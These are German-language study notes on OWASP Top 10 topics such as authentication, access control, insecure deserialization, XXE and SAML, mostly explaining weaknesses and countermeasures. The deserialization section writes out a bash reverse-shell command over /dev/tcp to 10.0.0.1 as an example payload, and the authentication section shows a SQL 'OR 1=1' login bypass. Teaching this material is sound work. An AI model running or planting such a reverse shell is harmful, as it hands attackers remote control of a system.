# SPRG 5 - The rest of OWASP 10

Enthält alle Dinge von der OWASP Top 10 Liste, abgesehen von injection, XSS und CSRF

## Broken Authentication and Session Management

### Authentication Terminology

- **Subject**: User / Entity welcher mit dem System interagiert
  - Muss nicht unbedingt ein end user (bzw. eine Person) sein
- **Pricipal**: Die Information über den User um sie zu identifizieren
  - Username
  - LDAP DN (Distinguished Name)
- **Credential**: Der Beweis das der User derjenige ist, der er vorgibt zu sein (identifiziert wie der Pricipal)
  - Passwort
  - Private Key
  - Andere Faktoren (biometrisch, zusätzliche Tokens usw.)



### Authentication Strength

- Normalerweise teilen wir Authentifizierung auf in:
  - **Weak authentication**
    - ist brechbar in einer vernüftigen Zeit
    - typischerweise Passwortbasierte authentifizierung
  - **Strong authentication**
    - ist schwieriger zu brechen
    - verwendet zertifizierungsbasierte (kryptografisch) authentifizierung oder multi-factor authentifizierung
- Je stärker der Authentifizierungsmechanismus ist, desto schwieriger ist es diesen zu brechen
- Die Stärke der Authentifizierung sollte ungefähr des Wertes der zu schützenden Daten entsprechen

### Standard Web Authentication Modes

- Von Browsern unterstützter Standardmechanismus
  - Der Server erwartet credentials im Authorization header
  - Der Server antwortet mit WWW-Authenticate header wenn die credentials fehlen (und vermutlich noch einem 403 als status code)
- **Basic Authentication** (WWW-Authenticate: Basic)
  - Username und Passwort werden im Schema ("username:password") in Base64 codiert und mitgeschickt
  - HTTPS ist zwingend erforderlich, da Username und Passwort unverschlüsselt verschickt werden (Base64 ist keine verschlüsselung!)
  - Das Passwort auf der Serverseite kann in einer beliebige Form gespeichert werden
    - -> Passwörter können sowohl in Plain-Text, als gehasht durch einen beliebigen Hashing-Algorithmus gespeichert werden (wobei Plain-Text selbstverständlich zu vermeiden ist)
- **Digest Authentication** (WWW-Authenticate: Digest)
  - Passwort wird als MD5 Hash versendet
  - HTTPS wird trotz hashind empfohlen, denn MD5 gilt als unsicher!!
  - Passwort muss im Plain-Text oder als MD5 Hash gespeichert werden
    - -> denn es ist nicht möglich Resultate von unterschiedlichen Hash-Algorithmen zu vergleichen!
    - -> sowohl Plain-Text, wie auch MD5 hashes sind selbstverständlich keine gute Idee zum Passwörter speichern
  - Da man für diesen Modus die Passwörter nicht mit einem Salt verstärken kann und auch sichere Hashing Algorithmen wie bcrypt und PBKDF2 nicht verwendet werden können, wird diese Variante **nicht empfohlen**!
- **Custom login page/form**
  - Die Applikation implementiert Loginformular und -logik
  - Server sendet Umleitung  zur Loginseite, sofern der User nicht authentifiziert ist
  - Auf der Loginseite werden principal und credential(s) eingegeben und zum Server gesendet
  - Der Server validiert die credentials setzt das *Subject* in Verbindung mit der Session
  - Das Passwort wird im Klartext versendet
    - HTTPS ist zwingend erforderlich!
- **Client certificate based**
  - Starke authentifizierung aufgrund des Zertifikates des Clients
  - Verlangt die Verwaltung von Zertifikaten und Keys für jeden Client
    - PKI ist eine komplizierte und kostspielige Sache
  - Häufig gegenseiteitiges TLS, 2-way-TLS oder 2-way-HTTPS genannt
  - Wird meistens in machine-to-machine scenarios verwendet

### Häufige Schwachstellen in der Authentifizierung

- Schwache implementierungen führen zu automatisierten Attacken wie:

  - **Credential stuffing**
    - Automatisches Testen von geleakten Logins (Username + Passwort)
  - **Dictionary attacks**
    - Automatisierte Testen von Passwörtern aus einer vordefinierten Liste bei bekannten Usernamen
  - **Brute Force**
    - Automatisiert einfach Passwörter durchprobieren

- Session management erlaubt session hijacking und session fixation wie z.B.:

  - **Wiederverwenden einer session ID**
  - **Aufdecken einer session ID (z.B.: URL rewriting)**
  - **Same session ID vor und nach dem Login**
  - **Zu kurze Session ID**

- Möglichkeiten die Authentifizierung zu umgehen

  - **Hidden fields**

    - vermutlich ist damit gemeint versteckte Felder zu manipulieren um sich die Rechte für etwas zu geben. Siehe Artikel von Burp Suite: https://support.portswigger.net/customer/portal/articles/1965741-using-burp-to-bypass-hidden-form-fields

  - **Forced browsing**

    - Seiten Aufrufen, welche von der Webseite nicht verlinkt, allerdings trotzdem aufrufbar sind

      z.B.: `example.com/users/calendar/user123/20190505`

      würde dann die Termine vom Benutzer user123 am 5. Mai 2019 ausgeben

      Quelle: https://www.owasp.org/index.php/Forced_browsing

- Injection Vulnerabilities

  - **XSS**
    - Credentials über XSS stehlen (z.B.: mit Keylogger)
  - **SQL, LDAP**
    - Authentifizierung umgehen
      - Z.B. Bei SQL mit `... WHERE username='' OR 1=1`
  - **SQL**
    - Credentials über Injection klauen

- Schwache Passwortrichtlinien

- Passwörter nicht sicher abgespeichert

### Authentication Best Practices

- Robuste Login implementation
  - Überall **HTTPS** verwenden
  - JavaScripts von anderen Parteien vermeiden, strikte Content Policy verwenden
  - Penetration Tests auf XSS und SQL Injection
  - Gute Passwortrichtlinien
  - Login ein wenig verzögern -> dadurch steigt die Zeit um Passwörter durch ausprobieren zu knacken expontentiel
  - Passwörter mit salts hashen und key stretching algorithmen verwenden (z.B.: bcrypt, PBKDF2)
- Authentifizierung zu einer vertrauenswürden Partei auslagen
  - SSO (Single Sign On)
  - OpenID Connect
- Session schützen
  - Lange randomisierte Session ID (mit hoher Entropie)
  - Beim Login die Session ID wechseln (verhindert Session fixation)
  - Session cookie schützen mit http-only, secure und same-site attribut

## Broken Access Control

- Access nicht mit Authentication verwechseln!
- Auf einem sehr abstrakten Level:
  - [Subject] [Object]
  - Access ::= read | write | append | execute
  - permission : Subject * Object -> Access
- Access Control kann man auch als eine Funktion bezeichnen
- Input: Subject (Benutzer) und Object (auf was zugegriffen wird)
- Output: Hat das Subject die erforderlichen Rechte um auf das Object zuzugreifen?
- Wird häufig auch in einer Matrix dargestellt (ACL)



### Access Control Models

- **DAC** -> **D**iscretionary **A**ccess **C**ontrol

  - Die Benutzer des Systems (meistens die Besitzer eines Objekts) legen die Zugriffsrechte fest
  - Beispiele:
    - Social Media
    - Dateisystem

- **MAC** -> **M**andatory **A**ccess **C**ontrol

  - Die Benutzer des Systems (abgesehen vom Administrator) können die Zugriffsrechte nicht anpassen
  - Beispiele:
    - Unix root
    - SE Linux

- **RBAC **-> **R**ole **B**ased **A**ccess **C**ontrol

  - Berechtigungen werden in Rollen (bzw. Gruppen) vergeben
  - Beispiele
    - Betriebssysteme (unter anderem Windows)

- **ABAC** -> **A**tribute **B**ased **A**ccess **C**ontrol

  - Entscheidungen werden aufgrund von bestimmten Eigenschaften getroffen

- **Policy Based**

  - Regeln sind extern und verwaltbar (siehe XACML)

  

- **Access Control Policy Categories**
  - **Open Policy** (Blacklist)
    - Erlaubt alle Zugriffe, sofern sie nicht explizit verboten wurden
  - **Closed Policy** (Whitelist)
    - Lehnt alle Zugriff ab, sofern sie keine explizite Zulassung haben

### Breaking Access Control

- Zugriffskontrolle umgehen

  - **Unsichere direkte Objekt Referenzen** / *Insecure Direct Object Reference*

    - User übergeben einer Applikation bei der Anfrage die Referenz auf ein Objekt, mit welchem sie Arbeiten möchten (Lesen, Bearbeiten, Löschen usw.)

    - Die Authorisierung prüft allerdings nicht die Beziehung zwischen dem Subjekt (Anfragesteller) und Objekt (begehrtes Objekt)

    - Ein Beispiel ist folgende API:

      api.one-bank.com/accounts/{account_id}/extendedInfo

      Es muss geprüft werden, ob der User die Berechtigung für dieses Objekt besitzt

  - **Fehlende Zugriffskntrolle auf Funktionsebene** / *Missing Function Level Access Control*

    - Applikationen verlassen sich bei der Zugriffskontrolle häufig auf die Präsentation der Logik
    - Soll heissen, dass Elemente (z.B.: Button zum Bearbeiten / Löschen) nur angezeigt werden, wenn der Benutzer die Berechtigung dazu hat
      - Diese Art der Zugrifsskontrolle wirkt meistens bei Tests für normale Anwender
    - Wenn jedoch keine Prüfung auf der Funktionsebene bei Anfragen besteht kann dies schnell zu Problemen führen wenn beispielsweise ein Angreifer sich eine Anfrage zusammenbastelt oder die Funktionalitäten dahinter plötzlich als API angeboten werden

  - **Falsche Konfiguration** / *Misconfigurations*

- "*Elevation of Privilege*" durch Manipulation der Metadaten

  - (Self-encoding) JWT Access Token
  - Cookies, Hidden Fields
    - Dies ist oft ein Problem bei der Authentifizierung: Die Applikation entscheidet bei der Access Control basierend auf der Eingabe des Users, welche ausserhalb der "trust boundary" ist. Auch wenn im Use Case des Entwicklers der User dies nicht modifiziert

### Access Control Best Practises

- Verwende standardmässig eine *Closed Policy* (Whitelist)

- Erzwinge es im Domain Model und verwende das Domain Model um darauf zu zugreiffen

  - Beispielsweise:

    `RelationShipManager.getCustomer().getAccount()`

    `RelationShipManager.getAllowedACtions(Account)`

- Verwende eine vertrauenswürdige Lösung für ABAC / Policy based access control

- Verlass dich nicht auf Inputs vom Client für Access Control Entscheidungen

  - Im Sinne von: Setze nicht einfach ein Flag auf der Webseite des Users, welches bei einer Anfrage mitgibt worauf der User Zugriffsrechte hat. Denn solche Dinge sind manipulierbar

- Lösche Access Tokens beim Logout / wenn eine Session abläuft. Z.B.:

  - Session Cookies / Tokens
  - JWT Tokens



## Sensitive Data Exposure

- Auf Sensible Daten achten. Sowohl bei der Übertragung, als auch beim Speichern
- Daten in Bewegung sind anfälliger darauf gestohlen (oder offengelegt) zu werden, daher sollte folgendes beachtet werden:
  - Es gibt mehrere Ebenen zum Schutz bei der Datenübertragung:
    - IPSec/VPN
    - HTTPS
  - Diese bieten einen Punkt-zu-Punkt Schutz im Netzwerk und auf der Applikationsschicht
- Was ist allerdings, wenn sensible Daten durch mehrere Komponenten gehen?
- Gespeicherte Daten (*Data at rest*):
  - Der Schutz ist normalerweise auf einer tieferen Ebene (z.B.: Hardware und OS)
  - Verschlüsselung in der Applikation ist untypisch, vor allem bei sehr sensiblen Daten (steht so in den Folien)
  - Die Keys dürfen nicht mit den Daten zusammen gespeichert werden
    - -> stattdessen sollten sie nur im Memory gespeichert und nicht serialisiert werden

## (Insecure De)serialization

- **Serialisierung** / *Serialization*
  - Den Status eines Objekt speichern
- **Deserialisierung** / *Deserialization*
  - Den Status eines Objektes aus dem Speicher wiederherstellen

- Mit "Status" sind die Werte eines Objekts gemeint. Beim Objekt Orientierten Programmieren wären das beispielsweise die Werte der Memberattribute eines Objekts
- Typische Verwendung:
  - Übertragen von Objekten
    - remote calls
  - Persistieren von Objekten
    - Caching
    - Session Daten speichern währen eines Server Neustarts

### Unsichere Deserialisierung

- Sicherheitsprobleme tauchen auf, wenn der Status von Objekten ausserhalb der trusted boundaries gespeichert ist. Z.B.:
  - Cookies
  - Datei, auf welche der Angreifer Zugriff hat
- Ein Angreifer kann
  - Den Status des Objektes lesen
    - so kommt er beispielsweise an Keys oder sonstige Geheimnisse
  - Status des Objektes manipulieren. Dies führt zu:
    - Tampering der Daten im Speicher
    - Schadcode ausführen (indem der Typ des deserialisierten Objektes verändert wird)
    - Applikation zum Crash bringen



- Beispiele für unsichere Deserialisierung
  - Java Serialisation ist ein Core Feature von Java
    - Dazu gehören:
      - `java.io.ObjectOutputStream`
      - `java.io.ObjectInputStream`
  - So kann ein Objekt auf dem Klassenpfad gespeichert werden
  - RMI/JMX ports in Java Applikationen des Servers deserialisieren einkommende Payloads und rufen die definierte Methode `readObject()` auf vor dem Type Check
- Was ist an `readObject()` schlecht?
  - Beispielsweise in der library commons-collections <= 3.2.1, ein Angreifer kann child Objekte erstellen und können auf Reflections basierende Methoden aufrufen zur deserialisierung
  - der Angreifer kann einen Payload zusammenschmieden, der beliebigen Java Code auf dem Klassenpfad ausführt
  - -> z.B.: eine Revers shell erstellen: 
    - `Runtime.getRuntime().exec("["/bin/bash", "-c", "exec 5<>/dev/tcp/10.0.0.1/2002;cat<&5 | while read line; do \$line 2>&5 >&5; done"] as String[]")`

### Deserialization Attacks verhindern

- Keine serialisierung verwenden
- Deserialisierung deaktivieren
- Funktionen, welche deserialisierung benötigen deaktivieren (z.B.: JMX)
- Blockiere / Limitiere Zugriff auf Ports von Services, welche RMI verwenden
- Wissen, welche ladbaren Klassen im Klassenpfad sind und gegebenenfalls limitieren
- Deserialisierungs Code isolieren und seine Rechte einschränken (z.B.: Dedizierte VM, Containers, SELinux oder einfach mit limitierten Privilegien laufen lassen)
- Integrität und Authentizität von zu deserialisierenden Objekten prüfen

## XML External Data Entities (XXE)

- XML Prozessor wird angewiesen eine Resource (z.B.: eine Datei) oder ähnliches in das zu verarbeitende Dokument mit einzubeziehen oder es an einen Web Service zu senden
- Es gibt 2 Typen von XML Schema Definitionen:
  - **XSD** -> **X**ml **Sc**hema **D**efinition
    - Basiert selbst auch auf XML (bzw. ist valides XML)
  - **DTD** -> **D**ocument **T**ype **D**efinition
    - Hat sein eigenes Format
- XXE betrifft nur DTD. Denn dies erlaubt entities (konstanten), welche auf eine externe System Resource zeigen mit den Protokollen `file:://` oder `http://`

### XXE Gegenmassnahmen

- XML Parser Konfigurieren

  - DTD deaktivieren
  - Entities deaktivieren
  - External Entities deaktivieren

- Mit Lexical Handler Scanen und nach "entities" Filtern

  - Methode beim SAX Parser (XML Parser) eine wichtige Methode überschreiben:

    ```java
    private static final class EntityFilterHandler implements org.xml.sax.ext.LexicalHandler {
        @Override
        public void startEntity(final String name) throws SAXException {
            // Entities mit Exceptions aus dem Verkehr ziehen
            throw new IllegalArgumentException("Entities are illegal")
        }
    }
    
    // Lexical scanner mitgeben
    saxParser.getXMLReader().setProperty("http://xml.org/sax/properties/lexical-handler", new EntityFilterHandler());
    ```

## Components with Known Vulnerabilities

- Softwarekomponenten regelmässig updaten (Patchversionen prüfen)
- Software Bill of Materials,
  - dependency / package management ist sehr Wichtig! Empfehlungen gemäss Folien:
    - Java -> Maven
    - JavaScript -> npm
    - Python -> pip
    - PHP -> packagist / composer
  - Bei NVD (National Vulnerability Database) und CVE (Common Vulnerabilities and Exposures) regelmässig die Komponenten des POMs prüfen
    - Kann in den build process / pipeline mit eingebaut werden
    - auch im Artefakt Repository, wenn es unterstützt wird (proxying public repositories is necessary)
- Geschwindigkeit und Level der Automation von build->test-deploy ist wichtig
- Es ist wichtig, dass das Scannen in die Pipeline eingebaut wird, aber ein Scan soll auch getriggert werden, wenn es Neuigkeiten im Datenset der Vulnerabilities gibt

## Insufficient Logging and Monitoring

- SIEM readiness: Relevante Log Einträge sollten im Voraus gestaltet werden (?! komische übersetzung)
- Definiere auditierbare events: Login, Failed-Login, High-Value Transaktionen usw.
- Liefere genügend Kontext mit den Logeinträgen für forensische Analysen (natürlich trotzdem immer an die Privacy denken)
- Der Log Stream sollte an eine Log Management Lösung gefüttert werden, welche diese nach verdächtigen Einträgen überwacht und Alarm gibt
- Incident Response und Recovery Plans vorbereiten

## Security Assertion Markup Language (SAML)

- Markup language und Protokol für den Austausch von Sicherheitsinformationen (auch assertions genannt)
- Hauptrolle in SAML
  - Subject oder Principal
  - Asserting Party
  - Relying Party
- Hauptanwendungsfall is **S**ingle-**S**ign-**O**n (**SSO**) mit folgenden Teilnehmern:
  - Identity Provider as Asserting Party
  - Service Provider as Relying Party
- Ein anderer Anwendungsfall ist Identity Propagation



### SAML Building Blocks

- SAML Assertions: statement über das Subject
  - Authentication statement
  - Attribute statement
- SAML Protocols or queries: means of acquiring statement
  - Authemtication query
  - Attribute query
  - Artifact Resolution Protocol
- SAML Bindings
  - HTTP Redirect binding
  - HTTP Post binding
  - SOAP Binding



